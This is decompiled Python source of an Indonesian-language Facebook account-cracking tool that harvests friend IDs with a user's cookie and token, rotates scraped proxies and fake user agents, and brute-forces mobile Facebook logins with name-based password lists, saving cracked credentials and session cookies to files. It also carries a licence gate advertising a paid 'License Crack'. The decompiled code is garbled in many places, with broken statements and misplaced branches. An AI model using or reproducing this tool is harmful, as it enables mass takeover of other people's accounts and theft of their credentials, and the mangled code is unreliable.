# Source Generated with ShoaibxAmer Pycdc
# File: Manis_pyc.pyc (Python 3.11)

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.console import Console
from rich.panel import Panel as panel
from licensing.methods import Key, Helpers
from halo import Halo
from rich.console import Console

def display_license_info(license_info, console_width):
    console = Console(width = console_width)
    panel_content = f''' \n    [bold]License Information:[/bold] \n    [cyan]Product ID:[/cyan] {getattr(license_info, 'product_id', 'N/A')} \n    [cyan]Customer ID:[/cyan] {getattr(license_info, 'customer_id', 'N/A')} \n    [cyan]Status:[/cyan] {getattr(license_info, 'blocked', 'N/A')} \n    '''
    console.print(panel(panel_content, title = 'License Info', border_style = 'white'))


def display_license_menu_banner(console_width):
    console = Console(width = console_width)
    os.system('clear')
    banner_content = '                              GNTML-HLNYP-IFKQX-YNUHU        '
    console.print(panel(banner_content, title = '[ MENU LISENSI ]', border_style = 'bold red'))

xiao_public_token = '<RSAKeyValue><Modulus>lubqe1gkOjICFlNNRnSAQGDPcXwQ60rUsf3XIZi+X4ou4R/5yDIvFJ73k4+E8zU52KQAIKvqHnuXGXHYXyvKsv1hIdT/4Jnduq3ZOA8Mb1+EG8QcW3RbHLEZ0yJUSsSl0zZ4if/j0h4njEMwogx6WDy89pEee2bv+STgDr7SrsaSdqoaOMLrtW3eati3SLq4V3/5g1gBkBcDIjmUyBORGvPa26oesHI4sM9Ig2K4MHaLbwF7BhzPrP3MIZkTtXw4BarZEQCxZyUuc4T/J7yKcg9R1YJ7ZU7JUwRouR0X5kkIfuzedw6iPL1FbcGOXpPn925xC7XTtnF44aHHQU0Ogw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>'
auth_key_licensi = 'WyI4MTg4OTk0NCIsIkFkY25kdUtvRy9lNTZyT1JtMk1rcjFMUEc5T082VG00S3ZKVkUzV0UiXQ=='

def Authkey():
    console_width = Console().width
    display_license_menu_banner(console_width)
    key = str(input(' ðŸ‘‰ Masukan Licensi : '))
    if not key:
        cetak(panel('[bold white]Input Lisensi Tidak Boleh Kosong. Silakan Masukkan Lisensi.', width = 90, title = '[[green] ManXD [/]]', padding = (0, 2), style = 'bold blue'))
    Halo(text = 'Loading..ðŸ’¤', spinner = 'star')
    result = Key.activate(token = auth_key_licensi, rsa_pub_key = xiao_public_token, product_id = '25642', key = key, machine_code = Helpers.GetMachineCode())
    None(None, None)
    if not None:
        pass
    if not Helpers.IsOnRightMachine(result[0]):
        cetak(panel('[bold white]                                   Server [bold green]150 [bold red]User Offline ', width = 90, title = '[[green] Arif-Sensei[/]]', padding = (0, 2), style = 'bold red'))
        time.sleep(3)
        os.system('xdg-open https://wa.me/6285378589955?text=Bang+Mau+Buy+License+Crack ')

if __name__ == '__main__':
    Authkey()
    cetak(panel('[bold white]                                   Server [bold green]150 [bold white]User Online ', width = 90, title = '[[green] Arif-Sensei[/]]', padding = (0, 2), style = 'bold red'))
    time.sleep(5)
pretty.install()
CON = sol()
ugen2 = []
ugen = []
cokbrut = []
ses = requests.Session()
princp = []
prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
open('.prox.txt', 'w').write(prox)
if Exception:
    e = None
    print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
    e = None
    del e
    e = None
    del e
prox = open('.prox.txt', 'r').read().splitlines()
for xd in range(10000):
    a = 'Mozilla/5.0 (Linux; U; Android 7.1.2;'
    b = random.randrange(1, 9)
    c = random.randrange(1, 9)
    d = 'Redmi 4A Build/N2G47H)'
    e = random.randrange(100, 9999)
    f = 'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
    g = random.randrange(1, 9)
    h = random.randrange(1, 4)
    i = random.randrange(1, 4)
    j = random.randrange(1, 4)
    k = 'Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2.append(uaku)
    for brayen in range(10000):
        rr = random.randint
        rc = random.choice
        teuing = random.choice([
            '001',
            '002',
            '003',
            '004',
            '005',
            '006',
            '007',
            '008',
            '009',
            '010',
            '011',
            '012',
            '013',
            '014',
            '015',
            '017',
            '018',
            '019',
            '020',
            '021',
            '022',
            '023',
            '024',
            '025',
            '026',
            '027',
            '028',
            '029',
            '030'])
        merek = random.choice([
            'SM-A405FN',
            'MEIZU 18s Pro',
            'NTN-AN20',
            'LeNumero1',
            'LM-K310IM',
            'Infinix X671',
            '4188S',
            'CPH2457',
            'Moto X40 Pro',
            'HIT P10a',
            'Redmi Note 8 Pro',
            'SM-A346M',
            'SM-J415FN',
            'SM-X706B',
            'SM-J337R4',
            'SM-A9000',
            'SM-G532G',
            'SM-J810M',
            'SM-T280',
            'M2012K11AG',
            'Infinix X5514D',
            'Meizu C10',
            'Infinix X657C',
            'Redmi S2',
            'MI 8',
            'Redmi Note 9 Pro',
            'M2103K19PG',
            'CPH2331',
            'Redmi 5A',
            'WOW64',
            'Z970',
            'Nexus One',
            'itel S11',
            'Intel Mac OS X',
            'SM-G1998',
            'POCO F2',
            'Redmi 4A'])
        build = random.choice([
            'TQ1A',
            'MX44LN',
            'TD1A',
            'OPM4',
            'TQ2A',
            'QQ1B',
            'RP1A',
            'N7MWON',
            'NK7T7Q',
            'OPR4',
            'LZASI7',
            'RD1B',
            'LRX22C',
            'GWK74',
            'R16NW',
            'FROYO',
            'JZO54K',
            'JSS15J',
            'GRWK74',
            'KOT49H',
            'MMB29M',
            'IMM76D',
            'KTU84P',
            'JDQ39',
            'LMY47X',
            'NMF26X',
            'M1AJQ',
            'GINGERBREAD',
            'OPM1',
            'TP1A',
            'RP1A',
            'PPR1',
            'PKQ1',
            'QP1A',
            'SP1A',
            'RKQ1',
            'QKQ1',
            'LMY48I',
            'KTU84P',
            'MRA58K',
            'FRF91',
            'SKQ1',
            'OPM1',
            'MMB29M'])
        u2 = f'''Mozilla/5.0 (Linux; Android {str(rr(4, 15))}; {merek} Build/{build}.{str(rr(111111, 210000))}.{teuing}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73, 150))}.0.{str(rr(5500, 5900))}.{str(rr(75, 150))} Mobile Safari/537.36'''
        u4 = f'''Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73, 150))}.0.{str(rr(5500, 5900))}.{str(rr(75, 150))} Mobile Safari/537.36'''
        u1 = f'''Mozilla/5.0 (Linux; Android {str(rr(4, 12))}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0, 4))} Chrome/{str(rr(73, 150))}.0.{str(rr(5500, 5900))}.{str(rr(75, 150))} Mobile Safari/537.36'''
        u3 = f'''Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(1, 20))}_{str(rr(0, 10))}_{str(rr(0, 10))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(73, 150))}.0.{str(rr(5500, 5900))}.{str(rr(75, 150))} Mobile/14G60 Safari/604.1'''
        UaMainn = random.choice([
            u2,
            u4,
            u1,
            u3])
        ugen.append(UaMainn)
        for memk in range(10000):
            rr = random.randint
            rc = random.choice
            gt = [
                'N4LEFH',
                'TQ2A',
                'QQ1B',
                'PQ1A',
                'SQ3A',
                'RD1B',
                'LDK2WU',
                'SD2A',
                'AB03E',
                'Z367Q',
                'R8638',
                'C886H']
            strt = f'''viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1, 20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50, 500))}.0.{str(rr(3990, 5001))}.{str(rr(20, 399))} Safari/537.36 Vivaldi/{str(rr(10, 400))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))}'''
            ical4 = f'''viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1, 20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50, 399))}.0.{str(rr(3990, 5001))}.{str(rr(20, 399))} Safari/537.36 Vivaldi/6.0.2979.18'''
            stt = f'''viabrowser;Safary-Mozilla/5.0 (Windows NT {str(rr(1, 20))}.{str(rr(1, 20))} .{str(rr(1, 20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50, 500))}.0.{str(rr(3990, 5001))}.{str(rr(20, 399))} Safari/537.36 Vivaldi/{str(rr(10, 400))}.0.{str(rr(111, 6666))}.{str(rr(10, 400))}'''
            fa5 = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
            fan = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36'
            fina = f'''Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100, 300))}.0.0.0 Mobile Safari/537.36'''
            uaku2 = random.choice([
                strt,
                ical4,
                stt,
                fa5,
                fan,
                fina])
            ugen.append(uaku2)
            
            def uaku():
                ua = open('uates.txt', 'r').read().splitlines()
                for ub in ua:
                    ugen.append(ub)
                    return None
                    a = requests.get('https://raw.githubusercontent.com/Acarmenidn/Ua/main/uates.txt').text
                    ua = open('.bbnew.txt', 'w')
                    aa = re.findall('line">(.*?)<', str(a))
                    for un in aa:
                        ua.write(un + '\n')
                        ua = open('.uates.txt', 'r').read().splitlines()
                        return None

            ua_nya = requests.get('https://raw.githubusercontent.com/Acarmenidn/Ua/main/uates.txt').text.splitlines()
            ArifMemek = random.choice(ua_nya)
            (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
            cokbrut = []
            pwpluss = []
            pwnya = []
            P = '\x1b[1;97m'
            M = '\x1b[1;91m'
            H = '\x1b[1;92m'
            K = '\x1b[1;93m'
            B = '\x1b[1;94m'
            U = '\x1b[1;95m'
            O = '\x1b[1;96m'
            N = '\x1b[0m'
            Z = '\x1b[1;30m'
            sir = '\x1b[41m\x1b[1;97m'
            x = '\x1b[m'
            m = '\x1b[1;91m'
            k = '\x1b[93m'
            h = '\x1b[1;92m'
            hh = '\x1b[32m'
            u = '\x1b[95m'
            kk = '\x1b[33m'
            b = '\x1b[1;96m'
            p = '\x1b[0;34m'
            asu = random.choice([
                m,
                k,
                h,
                u,
                b])
            dic = {
                '1': 'January',
                '2': 'February',
                '3': 'March',
                '4': 'April',
                '5': 'May',
                '6': 'June',
                '7': 'July',
                '8': 'August',
                '9': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'December' }
            dic2 = {
                '01': 'January',
                '02': 'February',
                '03': 'March',
                '04': 'April',
                '05': 'May',
                '06': 'June',
                '07': 'July',
                '08': 'August',
                '09': 'September',
                '10': 'October',
                '11': 'November',
                '12': 'Devember' }
            tgl = datetime.datetime.now().day
            bln = dic[str(datetime.datetime.now().month)]
            thn = datetime.datetime.now().year
            okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
            
            def alvino_xy(u):
                for e in u + '\n':
                    sys.stdout.write(e)
                    sys.stdout.flush()
                    time.sleep(0.005)
                    return None

            
            def clear():
                os.system('clear')

            
            def back():
                login()

            
            def banner():
                clear()
                alvino_xy(f'''\t\nâ•”â•â•—â”Œâ”€â”â”Œâ”€â”â”Œâ”€â”â”Œâ” â”Œâ”€â”â”Œâ”€â”â”¬â”Œâ”€   â•”â•¦â•—â”Œâ” â”Œâ”€â”\nâ• â•£ â”œâ”€â”¤â”‚  â”œâ”¤ â”œâ”´â”â”‚ â”‚â”‚ â”‚â”œâ”´â”â”€â”€â”€â•‘â•‘â•‘â”œâ”´â”â”œâ”¤ \nâ•š  â”´ â”´â””â”€â”˜â””â”€â”˜â””â”€â”˜â””â”€â”˜â””â”€â”˜â”´ â”´   â•© â•©â””â”€â”˜â”” \n{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N} ''')

            
            def login():
                token = open('.token.txt', 'r').read()
                cok = open('.cok.txt', 'r').read()
                tokenku.append(token)
                basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token=' + tokenku[0], cookies = {
                    'cookie': cok })
                basganteng = json.loads(basariheker.text)['id']
                menu(basganteng)
                return None
                if KeyError:
                    login_lagi334()
                    return None
                if None.exceptions.ConnectionError:
                    li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
                    lo = mark(li, style = 'red')
                    sol().print(lo, style = 'cyan')
                    exit()
                    return None
                if IOError:
                    login_lagi334()
                    return None

            
            def login_lagi334():
                os.system('clear')
                banner()
                cok = input('[+] masukan cookie : ')
                cos = {
                    'cookie': cok }
                data = {
                    'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
                    'scope': '' }
                req = ses.post('https://graph.facebook.com/v16.0/device/login/', data = data).json()
                cd = req['code']
                ucd = req['user_code']
                url = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038' % cd
                req = sop(ses.get('https://mbasic.facebook.com/device', cookies = cos).content, 'html.parser')
                raq = req.find('form', {
                    'method': 'post' })
                dat = {
                    'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(raq)).group(1),
                    'fb_dtsg': re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(req)).group(1),
                    'qr': '0',
                    'user_code': ucd }
                rel = 'https://mbasic.facebook.com' + raq['action']
                pos = sop(ses.post(rel, data = dat, cookies = cos).content, 'html.parser')
                dat = { }
                raq = pos.find('form', {
                    'method': 'post' })
                for x in raq('input', {
                    'value': True }):
                    if x['name'] == '__CANCEL__':
                        pass
                    dat.update({
                        x['name']: x['value'] })
                    if Exception:
                        e = None
                        e = None
                        del e
                        e = None
                        del e
                    rel = 'https://mbasic.facebook.com' + raq['action']
                    pos = sop(ses.post(rel, data = dat, cookies = cos).content, 'html.parser')
                    req = ses.get(url, cookies = cos).json()
                    tok = req['access_token']
                    kot = open('.token.txt', 'w').write(tok)
                    koc = open('.cok.txt', 'w').write(cok)
                    masuk = input('\n[+] tekan enter')
                    os.system('clear')
                    login()
                    return None
                    if Exception:
                        e = None
                        print(e)
                        e = None
                        del e
                        return None
                    e = None
                    del e

            
            def menu(id):
                token = open('.token.txt', 'r').read()
                cok = open('.cok.txt', 'r').read()
                if IOError:
                    print('[Ã—] Cookies Kadaluarsa ')
                    time.sleep(5)
                    login_lagi334()
                os.system('clear')
                banner()
                print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                print(f''' [1] MALING PUBLIK {b}ON{N} ''')
                print(f''' [2] MALING FILE {b}ON{N} ''')
                print(f''' [3] MALING MAIL {m}OF{N} ''')
                print(' [4] HASIL ')
                print(' [5] DELETE COOKIE ')
                print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                _____xsok__fan_____ = input(' >> PILIH : ')
                if _____xsok__fan_____ in ('1',):
                    dump_massal()
                    return None
                if None in ('2',):
                    crack_file()
                    return None
                if None in ('3',):
                    email()
                    return None
                if None in ('4',):
                    result()
                    return None
                if None in ('5',):
                    os.system('rm -rf .token.txt')
                    os.system('rm -rf .cookie.txt')
                    print(' >> BERHASIL HAPUS COKIIE ')
                    exit()
                    return None
                None('>> Pilih Nu Bener Asu ')
                back()

            
            def error():
                print(f'''{k}>> Maaf Fitur Iyeu Masih Di Perbaiki {x}''')
                time.sleep(4)
                back()

            
            def result():
                print(' [1] Hasil CP Maneh ')
                print(' [2] Hasil OK Maneh ')
                print('>> Kembali\t')
                kz = input('\n>> Pilih : ')
                if kz in ('1', '01'):
                    vin = os.listdir('CP')
                    if FileNotFoundError:
                        print('>> File Tidak Di Temukan ')
                        time.sleep(3)
                        back()
                    if len(vin) == 0:
                        print('>> Anda Tidak Memiliki Hasil CP ')
                        time.sleep(2)
                        back()
                        return None
                    cih = None
                    lol = { }
                    for isi in vin:
                        hem = open('CP/' + isi, 'r').readlines()
                        cih += 1
                        if cih < 10:
                            nom = '0' + str(cih)
                            lol.update({
                                str(cih): str(isi) })
                            lol.update({
                                nom: str(isi) })
                            print('[' + nom + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                        lol.update({
                            str(cih): str(isi) })
                        print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                        geeh = input('\n>> Pilih : ')
                        geh = lol[geeh]
                        if KeyError:
                            print('>> Pilih Yang Bener Kontol ')
                            exit()
                    lin = open('CP/' + geh, 'r').read().splitlines()
                    print('>> File Tidak Di Temukan ')
                    time.sleep(2)
                    back()
                    nocp = 0
                    for cpku in range(len(lin)):
                        cpkuni = lin[nocp].split('|')
                        cpkuh = f'''# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'''
                        sol().print(mark(cpkuh, style = 'yellow'))
                        nocp += 1
                        input('[ Klik Enter ]')
                        back()
                        return None
                        if kz in ('2', '02'):
                            vin = os.listdir('OK')
                            if FileNotFoundError:
                                print('>> File Tidak Di Temukan ')
                                time.sleep(2)
                                back()
                            if len(vin) == 0:
                                print('>> Anda Tidak Mempunyai File OK ')
                                time.sleep(2)
                                back()
                                return None
                            cih = None
                            lol = { }
                            for isi in vin:
                                hem = open('OK/' + isi, 'r').readlines()
                                cih += 1
                                if cih < 100:
                                    nom = '0' + str(cih)
                                    lol.update({
                                        str(cih): str(isi) })
                                    lol.update({
                                        nom: str(isi) })
                                    print('[' + nom + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                                lol.update({
                                    str(cih): str(isi) })
                                print('[' + str(cih) + '] ' + isi + ' [ ' + str(len(hem)) + ' Account ]' + x)
                                geeh = input('\n>> Pilih : ')
                                geh = lol[geeh]
                                if KeyError:
                                    print('>> Pilih Yang Bener Kontol ')
                                    exit()
                            lin = open('OK/' + geh, 'r').read().splitlines()
                            print('>> File Tidak Di Temukan ')
                            time.sleep(2)
                            back()
                            nocp = 0
                            for cpku in range(len(lin)):
                                cpkuni = lin[nocp].split('|')
                                cpkuh = f'''# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'''
                                sol().print(mark(cpkuh, style = 'green'))
                                print(f'''{hh}COOKIE : {x}{cpkuni[2]}''')
                                nocp += 1
                                input('[ Klik Enter ]')
                                back()
                                return None
                                if kz in ('0', '00'):
                                    back()
                                    return None
                                None('>> Pilih Yang Bener Kontol ')
                                exit()
                                return None

            
            def crack_file():
                file = input(' >> masukan nama folder/file : ')
                uid = open(file, 'r').read().splitlines()
                for data in uid:
                    (user, nama) = data.split('|')
                    (sys.stdout.write(f'''\r >> sedang mengumpulkan idz, sukses mengumpulkan {H}{len(id)}{P} id....{P}'''),)
                    sys.stdout.flush()
                    id.append(data)
                    if FileNotFoundError:
                        exit(' [:] file tidak ada')
                setting()

            
            def dump_massal():
                token = open('.token.txt', 'r').read()
                cok = open('.cok.txt', 'r').read()
                if IOError:
                    exit()
                kumpulkan = int(input(' >> Hayang Baraha Target : '))
                if ValueError:
                    exit()
                if kumpulkan < 1 or kumpulkan > 1000:
                    exit()
                ses = requests.Session()
                bilangan = 0
                for KOTG49H in range(kumpulkan):
                    bilangan += 1
                    Masukan = input(' >> Idz Target Ka ' + str(bilangan) + ' : ')
                    uid.append(Masukan)
                    for user in uid:
                        head = {
                            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36' }
                        if len(id) == 0:
                            params = {
                                'access_token': token,
                                'fields': 'friends' }
                        params = {
                            'access_token': token,
                            'fields': 'friends' }
                        url = requests.get('https://graph.facebook.com/{}'.format(user), params = params, headers = head, cookies = {
                            'cookies': cok }).json()
                        for xr in url['friends']['data']:
                            woy = xr['id'] + '|' + xr['name']
                            if woy in id:
                                pass
                            id.append(woy)
                            if (KeyError, IOError):
                                pass
                        if requests.exceptions.ConnectionError:
                            exit()
                        print(' >> Berhasil Mengumpulkan : ' + str(len(id)))
                        time.sleep(3)
                        setting()
                        return None
                        if requests.exceptions.ConnectionError:
                            exit()
                            return None
                        if (None, IOError):
                            exit()
                            return None

            
            def setting():
                os.system('clear')
                banner()
                print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                print(' [1] MALING AKUN KOLOT ')
                print(' [2] MALING AKUN ANYAR  ')
                print(' [3] MALING AKUN ACAK ')
                print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                hu = input('>> PILIH : ')
                if hu in ('1', '01'):
                    for tua in sorted(id):
                        id2.append(tua)
                        if hu in ('2', '02'):
                            muda = []
                            for bacot in sorted(id):
                                muda.append(bacot)
                                bcm = len(muda)
                                bcmi = bcm - 1
                                for xmud in range(bcm):
                                    id2.append(muda[bcmi])
                                    bcmi -= 1
                                    if hu in ('3', '03'):
                                        for bacot in id:
                                            xx = random.randint(0, len(id2))
                                            id2.insert(xx, bacot)
                                            print('>> Pilih Yang Bener Kontooll ')
                                            exit()
                                            os.system('clear')
                                            banner()
                                            print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                                            print(' [1] M1 ')
                                            print(' [2] M2 ')
                                            print(' [3] M3 ')
                                            print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                                            hc = input('>> PILIH : ')
                                            if hc in ('1', '01'):
                                                method.append('reguler')
                if hc in ('2', '02'):
                    method.append('validate')
                if hc in ('3', '03'):
                    method.append('geni')
                method.append('mobile')
                passwrd()

            
            def passwrd():
                os.system('clear')
                banner()
                print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                print(f''' >> Tottal Account : {h}''' + str(len(id)))
                print(f'''{x} >> Mode Pesawat 100 Idz{x}''')
                print(f'''{h}â«------------ {p}â‰ª Â°âˆÂ° â‰«{h} ------------âª{N}''')
                pool = tred(max_workers = 30)
                for yuzong in id2:
                    nmf = yuzong.split('|')[1].lower()
                    idf = yuzong.split('|')[0]
                    frs = nmf.split(' ')[0]
                    pwv = [
                        'bismillah',
                        'bismillah123',
                        'gresik123',
                        'gresik']
                    if len(nmf) < 6:
                        if len(frs) < 3:
                            pass
                        pwv.append(frs + '123')
                        pwv.append(frs + '321')
                        pwv.append(frs + '01')
                        pwv.append(frs + '02')
                        pwv.append(frs + '03')
                        pwv.append(frs + '04')
                        pwv.append(frs + '05')
                        pwv.append(frs + '06')
                        pwv.append(frs + '07')
                        pwv.append(frs + '08')
                        pwv.append(frs + '09')
                        pwv.append(frs + '12')
                        pwv.append(frs + '13')
                        pwv.append(frs + '14')
                        pwv.append(frs + '15')
                        pwv.append(frs + '16')
                        pwv.append(frs + '17')
                        pwv.append(frs + '18')
                        pwv.append(frs + '19')
                        pwv.append(frs + '20')
                    if len(frs) < 3:
                        pwv.append(nmf)
                    pwv.append(nmf)
                    pwv.append(frs + '21')
                    pwv.append(frs + '22')
                    pwv.append(frs + '23')
                    pwv.append(frs + '24')
                    pwv.append(frs + '25')
                    pwv.append(frs + '26')
                    pwv.append(frs + '27')
                    pwv.append(frs + '28')
                    pwv.append(frs + '29')
                    pwv.append(frs + '30')
                    pwv.append(frs + '32')
                    pwv.append(frs + '34')
                    pwv.append(frs + '35')
                    pwv.append(frs + '36')
                    pwv.append(frs + '37')
                    pwv.append(frs + '38')
                    pwv.append(frs + '39')
                    pwv.append(frs + '40')
                    pwv.append(frs + '2004')
                    pwv.append(frs + '2005')
                    pwv.append(frs + '2006')
                    pwv.append(frs + '2007')
                    pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
                    if 'ya' in pwpluss:
                        for xpwd in pwnya:
                            pwv.append(xpwd)
                            if 'reguler' in method:
                                pool.submit(crack, idf, pwv)
                    if 'validate' in method:
                        pool.submit(crackfree, idf, pwv)
                    if 'geni' in method:
                        pool.submit(crackgeni, idf, pwv)
                    pool.submit(crackasync, idf, pwv)
                    None(None, None)
                    if not None:
                        pass
                print('')
                cetak(nel('\t[cyan]>>[green] Maling Selesai Ngab, Tong Poho Bersyukur[cyan] <<[white] '))
                print(f'''[{b}â€¢{x}]{h} OK : {h}%s ''' % ok)
                print(f'''{x}[{b}â€¢{x}]{k} CP : {k}%s{x} ''' % cp)
                print('')
                print('>> Lanjut Maling Deui ( Y/t ) ? ')
                woi = input('>> Pilih : ')
                if woi in ('y', 'Y'):
                    back()
                    return None
                None(f'''\t{x}>>{k} Good Bye Dadaahh{x} << ''')
                time.sleep(2)
                exit()

            
            def crack(idf, pwv):
                global cp, ok, loop
                bo = random.choice([
                    m,
                    k,
                    h,
                    b,
                    u,
                    x])
                (sys.stdout.write(f'''\r M1 {P}|{loop}{P}|{u}{len(id)}{P}{P}|{H}{ok}{P}{P}|{k}{cp}{x}||{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}|'''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
                for pw in pwv:
                    link = ses.get('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
                    data = {
                        'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                        'm_ts': re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                        'li': re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                        'try_number': re.search('name="try_number" value="(.*?)"', str(link.text)).group(1),
                        'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"', str(link.text)).group(1),
                        'email': idf,
                        'pass': pw,
                        'login': 'Masuk',
                        'bi_xrwh': '0' }
                    headers = {
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': ArifMemek,
                        'viewport-width': '980' }
                    params = {
                        'refsrc': 'deprecated',
                        'lwv': '100',
                        'ref': 'dbl' }
                    po = ses.post('https://m.facebook.com/login/device-based/regular/login/', params = params, headers = headers, data = data, allow_redirects = False)
                    if 'checkpoint' in po.cookies.get_dict().keys():
                        print(f'''\r[{K}CP{N}] {idf}|{pw}\n>> {u}{ua}{N}''')
                        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                        akun.append(idf + '|' + pw)
                        cp += 1
                        'same-origin'
                    if 'datr' in ses.cookies.get_dict().keys():
                        ok += 1
                        coki = po.cookies.get_dict()
                        kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
                        print(f'''\r[OK] {h}{idf}|{pw}\n>> {kuki}\n>> {u}{ua}{N}''')
                        open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + ua + '\n')
                        cek_apk(session, coki)
                        ';'.join
                    if requests.exceptions.ConnectionError:
                        'sec-fetch-site'
                        time.sleep(31)
                    loop += 1
                    return None

            
            def crackfree(idf, pwv):
                global cp, ok, loop
                bo = random.choice([
                    m,
                    k,
                    h,
                    b,
                    u,
                    x])
                (sys.stdout.write(f'''\rM2 {P}[{b}{loop}{P}/{u}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
                for pw in pwv:
                    nip = random.choice(prox)
                    proxs = {
                        'http': 'socks4://' + nip }
                    ses.headers.update({
                        'Host': 'mbasic.facebook.com',
                        'cache-control': 'max-age=0',
                        'sec-ch-ua-mobile': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': ua,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-dest': 'empty',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
